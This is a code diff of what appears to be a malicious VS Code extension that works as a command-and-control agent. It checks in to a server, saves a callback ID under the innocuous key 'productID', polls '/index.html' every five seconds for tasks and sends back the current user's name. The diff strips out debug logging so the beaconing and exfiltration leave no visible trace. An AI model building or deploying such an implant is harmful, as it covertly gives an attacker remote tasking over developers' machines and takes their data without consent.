@@ -57,10 +57,8 @@ function checkIn(context) {
 
 			const callbackUUID = checkinResponse['id'];
 			context.globalState.update('productID', callbackUUID);
-			outchan.append("\nGot Callback ID: " + callbackUUID + "\n");
 		})
 		.catch(function (error) {
-			outchan.append("\nCHECKIN ERROR\n");
 			outchan.append("\n" + error.message + "\n");
 		});
 }
@@ -77,12 +75,10 @@ function getTasking(context) {
 	client.post('/index.html', encoded_request)
 		.then(function (response) {
 			const taskingResponse = parseResponse(response)
-			outchan.append("\n<- GOT TASKING\n");
 
 			handleTasks(context, taskingResponse.tasks)
 		})
 		.catch(function (error) {
-			outchan.append("\nGET TASKING ERROR\n");
 			outchan.append(`${error.message}`);
 		});
 }
@@ -96,8 +92,6 @@ function handleTasks(context, tasks) {
 		const parameters = task['parameters']
 
 		if (command == 'current_user') {
-			outchan.append("\nTask ID: " + taskID + "\n");
-			outchan.append("\n" + os.userInfo().username + "\n");
 			const output = os.userInfo().username
 			postTaskResponse(callbackUUID, taskID, output)
 		}
@@ -116,7 +110,6 @@ function postTaskResponse(uuid, taskID, output) {
 	client.post('/index.html', encoded_request)
 		.then(function (response) {
 			const taskingResponse = parseResponse(response)
-			outchan.append(`${JSON.stringify(taskingResponse)}`);
 		})
 		.catch(function (error) {
 			outchan.append(`${error.message}`);
@@ -130,7 +123,6 @@ function activate(context) {
 	const callbackUUID = context.globalState.get('productID')
 
 	if (callbackUUID != null) {
-		outchan.append("\nExisting Callback ID: " + callbackUUID + "\n");
 		setInterval(getTasking, 5000, context);
 	} else {
 		checkIn(context);
